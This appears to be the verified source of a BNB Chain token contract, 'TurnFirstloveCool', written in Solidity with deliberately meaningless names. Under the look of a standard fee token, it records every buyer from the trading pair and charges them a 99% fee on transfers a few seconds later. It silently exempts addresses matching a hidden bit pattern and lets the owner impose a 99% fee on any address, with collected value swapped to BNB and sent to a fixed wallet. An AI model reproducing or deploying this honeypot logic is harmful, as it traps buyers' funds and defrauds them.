/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract TurnFirstloveCool is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Turn Firstlove Cool ";
    string constant _symbol = "TurnFirstloveCool";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private tradingIsLiquidityMarketing;
    mapping(address => bool) private launchedMarketingBotsTrading;
    mapping(address => bool) private modeSellReceiverBots;
    mapping(address => bool) private liquidityBurnTradingIs;
    mapping(address => uint256) private walletMarketingLaunchedBots;
    mapping(uint256 => address) private botsExemptSwapLaunchedBuyWalletIs;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private launchedWalletLiquidityExempt = 0;
    uint256 private isBurnSellLaunched = 9;

    //SELL FEES
    uint256 private txBurnLiquidityIsReceiverModeMin = 0;
    uint256 private autoTxSellLiquidity = 9;

    uint256 private swapLiquidityAutoTx = isBurnSellLaunched + launchedWalletLiquidityExempt;
    uint256 private autoFeeMinSwap = 100;

    address private liquidityMinBurnMarketing = (msg.sender); // auto-liq address
    address private buyLaunchedBurnBots = (0x79FE9a7BB90Fd176Dd2Cf078FfffcDf991cF1AcC); // marketing address
    address private liquiditySwapFeeLaunched = DEAD;
    address private isLaunchedMaxBots = DEAD;
    address private sellMarketingBotsTrading = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private walletBuyModeLiquidity;
    uint256 private receiverBurnBotsTrading;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private sellLaunchedLimitBurn;
    uint256 private liquiditySwapModeExempt;
    uint256 private burnModeFeeLimit;
    uint256 private isBurnLiquidityExemptAutoLaunchedTeam;
    uint256 private receiverBuyMaxBurnTxSwapSell;

    bool private autoTradingSellSwap = true;
    bool private liquidityBurnTradingIsMode = true;
    bool private isFeeTradingReceiverTxBurn = true;
    bool private maxBuyLimitBotsSell = true;
    bool private modeBotsSwapTx = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private isMaxWalletLaunched = _totalSupply / 1000; // 0.1%

    
    uint256 private walletSellReceiverLiquidity;
    uint256 private botsWalletMinLiquidity;
    uint256 private maxReceiverMarketingSwap;
    uint256 private sellModeReceiverLiquidity;
    bool private launchedBurnIsMin;
    uint256 private burnSellExemptMin;
    uint256 private launchedTradingWalletSwap;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        sellLaunchedLimitBurn = true;

        tradingIsLiquidityMarketing[msg.sender] = true;
        tradingIsLiquidityMarketing[address(this)] = true;

        launchedMarketingBotsTrading[msg.sender] = true;
        launchedMarketingBotsTrading[0x0000000000000000000000000000000000000000] = true;
        launchedMarketingBotsTrading[0x000000000000000000000000000000000000dEaD] = true;
        launchedMarketingBotsTrading[address(this)] = true;

        modeSellReceiverBots[msg.sender] = true;
        modeSellReceiverBots[0x0000000000000000000000000000000000000000] = true;
        modeSellReceiverBots[0x000000000000000000000000000000000000dEaD] = true;
        modeSellReceiverBots[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return modeReceiverSellSwap(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return modeReceiverSellSwap(sender, recipient, amount);
    }

    function modeReceiverSellSwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = isSellWalletMin(sender) || isSellWalletMin(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                launchedMinTxMaxSellWalletReceiver();
            }
            if (!bLimitTxWalletValue) {
                exemptIsWalletMinSell(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return txExemptBotsIs(sender, recipient, amount);}

        if (!tradingIsLiquidityMarketing[sender] && !tradingIsLiquidityMarketing[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || modeSellReceiverBots[sender] || modeSellReceiverBots[recipient], "Max TX Limit has been triggered");

        if (sellMinTeamTradingFeeSwap()) {txTradingSellTeam();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = exemptSwapTxBurnSell(sender) ? receiverSwapModeLimitWallet(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function txExemptBotsIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function exemptSwapTxBurnSell(address sender) internal view returns (bool) {
        return !launchedMarketingBotsTrading[sender];
    }

    function exemptReceiverBotsBurn(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            swapLiquidityAutoTx = autoTxSellLiquidity + txBurnLiquidityIsReceiverModeMin;
            return modeMaxTradingIs(sender, swapLiquidityAutoTx);
        }
        if (!selling && sender == uniswapV2Pair) {
            swapLiquidityAutoTx = isBurnSellLaunched + launchedWalletLiquidityExempt;
            return swapLiquidityAutoTx;
        }
        return modeMaxTradingIs(sender, swapLiquidityAutoTx);
    }

    function receiverSwapModeLimitWallet(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(exemptReceiverBotsBurn(sender, receiver == uniswapV2Pair)).div(autoFeeMinSwap);

        if (liquidityBurnTradingIs[sender] || liquidityBurnTradingIs[receiver]) {
            feeAmount = amount.mul(99).div(autoFeeMinSwap);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function isSellWalletMin(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function modeMaxTradingIs(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = walletMarketingLaunchedBots[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function exemptIsWalletMinSell(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        botsExemptSwapLaunchedBuyWalletIs[exemptLimitValue] = addr;
    }

    function launchedMinTxMaxSellWalletReceiver() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (walletMarketingLaunchedBots[botsExemptSwapLaunchedBuyWalletIs[i]] == 0) {
                    walletMarketingLaunchedBots[botsExemptSwapLaunchedBuyWalletIs[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(buyLaunchedBurnBots).transfer(amountBNB * amountPercentage / 100);
    }

    function sellMinTeamTradingFeeSwap() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    modeBotsSwapTx &&
    _balances[address(this)] >= isMaxWalletLaunched;
    }

    function txTradingSellTeam() internal swapping {
        uint256 amountToLiquify = isMaxWalletLaunched.mul(launchedWalletLiquidityExempt).div(swapLiquidityAutoTx).div(2);
        uint256 amountToSwap = isMaxWalletLaunched.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = swapLiquidityAutoTx.sub(launchedWalletLiquidityExempt.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(launchedWalletLiquidityExempt).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(isBurnSellLaunched).div(totalETHFee);

        payable(buyLaunchedBurnBots).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                liquidityMinBurnMarketing,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBotsExemptSwapLaunchedBuyWalletIs(uint256 a0) public view returns (address) {
        if (a0 != isMaxWalletLaunched) {
            return isLaunchedMaxBots;
        }
        if (a0 == autoTxSellLiquidity) {
            return buyLaunchedBurnBots;
        }
            return botsExemptSwapLaunchedBuyWalletIs[a0];
    }
    function setBotsExemptSwapLaunchedBuyWalletIs(uint256 a0,address a1) public onlyOwner {
        if (a0 == swapLiquidityAutoTx) {
            liquidityMinBurnMarketing=a1;
        }
        if (a0 != swapLiquidityAutoTx) {
            sellMarketingBotsTrading=a1;
        }
        botsExemptSwapLaunchedBuyWalletIs[a0]=a1;
    }

    function getIsMaxWalletLaunched() public view returns (uint256) {
        if (isMaxWalletLaunched != isBurnSellLaunched) {
            return isBurnSellLaunched;
        }
        return isMaxWalletLaunched;
    }
    function setIsMaxWalletLaunched(uint256 a0) public onlyOwner {
        if (isMaxWalletLaunched == txBurnLiquidityIsReceiverModeMin) {
            txBurnLiquidityIsReceiverModeMin=a0;
        }
        if (isMaxWalletLaunched != swapLiquidityAutoTx) {
            swapLiquidityAutoTx=a0;
        }
        isMaxWalletLaunched=a0;
    }

    function getSellMarketingBotsTrading() public view returns (address) {
        return sellMarketingBotsTrading;
    }
    function setSellMarketingBotsTrading(address a0) public onlyOwner {
        sellMarketingBotsTrading=a0;
    }

    function getTradingIsLiquidityMarketing(address a0) public view returns (bool) {
        if (tradingIsLiquidityMarketing[a0] == tradingIsLiquidityMarketing[a0]) {
            return maxBuyLimitBotsSell;
        }
        if (tradingIsLiquidityMarketing[a0] == launchedMarketingBotsTrading[a0]) {
            return modeBotsSwapTx;
        }
        if (tradingIsLiquidityMarketing[a0] != modeSellReceiverBots[a0]) {
            return liquidityBurnTradingIsMode;
        }
            return tradingIsLiquidityMarketing[a0];
    }
    function setTradingIsLiquidityMarketing(address a0,bool a1) public onlyOwner {
        if (a0 != sellMarketingBotsTrading) {
            liquidityBurnTradingIsMode=a1;
        }
        if (a0 != buyLaunchedBurnBots) {
            maxBuyLimitBotsSell=a1;
        }
        if (tradingIsLiquidityMarketing[a0] != liquidityBurnTradingIs[a0]) {
           liquidityBurnTradingIs[a0]=a1;
        }
        tradingIsLiquidityMarketing[a0]=a1;
    }

    function getMaxBuyLimitBotsSell() public view returns (bool) {
        if (maxBuyLimitBotsSell != autoTradingSellSwap) {
            return autoTradingSellSwap;
        }
        return maxBuyLimitBotsSell;
    }
    function setMaxBuyLimitBotsSell(bool a0) public onlyOwner {
        maxBuyLimitBotsSell=a0;
    }

    function getSwapLiquidityAutoTx() public view returns (uint256) {
        return swapLiquidityAutoTx;
    }
    function setSwapLiquidityAutoTx(uint256 a0) public onlyOwner {
        if (swapLiquidityAutoTx != isMaxWalletLaunched) {
            isMaxWalletLaunched=a0;
        }
        swapLiquidityAutoTx=a0;
    }

    function getLaunchedWalletLiquidityExempt() public view returns (uint256) {
        if (launchedWalletLiquidityExempt != autoFeeMinSwap) {
            return autoFeeMinSwap;
        }
        return launchedWalletLiquidityExempt;
    }
    function setLaunchedWalletLiquidityExempt(uint256 a0) public onlyOwner {
        if (launchedWalletLiquidityExempt == isMaxWalletLaunched) {
            isMaxWalletLaunched=a0;
        }
        if (launchedWalletLiquidityExempt != txBurnLiquidityIsReceiverModeMin) {
            txBurnLiquidityIsReceiverModeMin=a0;
        }
        launchedWalletLiquidityExempt=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}